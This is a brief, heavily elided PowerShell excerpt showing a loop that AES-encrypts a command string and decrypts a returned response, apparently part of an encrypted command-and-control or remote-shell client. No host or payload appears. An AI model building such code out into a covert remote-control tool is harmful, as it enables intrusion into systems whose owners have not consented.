...
While ($true) {
    Try {
        ...
        $encryptedCMD = $aes.CreateEncryptor().TransformFinalBlock(
            [Text.Encoding]::ASCII.GetBytes($CMD), 0, $CMD.Length)
        ...
        $decryptedResp = $aes.CreateDecryptor().TransformFinalBlock(
            $encryptedResp, 0, $bytesRead)
